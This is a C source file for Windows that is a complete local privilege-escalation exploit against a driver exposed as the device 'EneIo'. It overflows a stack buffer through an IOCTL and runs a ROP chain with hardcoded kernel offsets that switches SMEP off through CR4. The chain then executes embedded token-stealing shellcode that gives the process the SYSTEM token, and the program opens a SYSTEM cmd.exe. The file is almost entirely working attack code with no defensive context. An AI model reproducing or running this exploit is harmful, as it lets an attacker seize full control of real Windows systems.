#include <windows.h>
#include <stdio.h>
#include <psapi.h>

#define IOCTL_STACK_OVERFLOW 0x80102040
#define QWORD ULONGLONG

BYTE tokenStealing[60] = {
    0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    0x48, 0x8b, 0x82, 0xb8, 0x00, 0x00, 0x00,             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    0x50, 0x5b,                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    0x48, 0x8b, 0x9b, 0x48, 0x04, 0x00, 0x00,             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    0x48, 0x81, 0xeb, 0x48, 0x04, 0x00, 0x00,             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    0x48, 0x83, 0xbb, 0x40, 0x04, 0x00, 0x00, 0x04,       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    0x75, 0xe8,                                           //     jnz .loop                    ; if zf == 0 -> loop
    0x48, 0x8b, 0x8b, 0xb8, 0x04, 0x00, 0x00,             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    0x80, 0xe1, 0xf0,                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    0x48, 0x89, 0x88, 0xb8, 0x04, 0x00, 0x00,             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    0xc3                                                  // ret                              ; return
};

QWORD GetKernelBase() {
    LPVOID drivers[1024];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
    return (QWORD) drivers[0];
}

int main() {
    HANDLE hDevice = CreateFileA("\\\\.\\EneIo", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to get handle: 0x%x\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    LPVOID payload = VirtualAlloc(NULL, 120, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, sizeof(tokenStealing), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload, 56, 'A');
    RtlCopyMemory(shellcode, tokenStealing, sizeof(tokenStealing));

    QWORD kernelBase = GetKernelBase();
    QWORD *rop = (QWORD *) ((QWORD) payload + 56);

    *rop++ = (QWORD) kernelBase + 0x202e71; // pop rcx; ret;
    *rop++ = (QWORD) 0x250ef8;              // SMEP off
    *rop++ = (QWORD) kernelBase + 0x3a0bd7; // mov cr4, rcx; ret;
    *rop++ = (QWORD) shellcode;             // token stealing
    *rop++ = (QWORD) kernelBase + 0x202e71; // pop rcx; ret;
    *rop++ = (QWORD) 0x350ef8;              // SMEP on
    *rop++ = (QWORD) kernelBase + 0x3a0bd7; // mov cr4, rcx; ret;
    *rop++ = (QWORD) kernelBase + 0x20003e; // ret;

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload, 120, NULL, 0, NULL, NULL);
    system("cmd.exe");

    CloseHandle(hDevice);
    return 0;
}
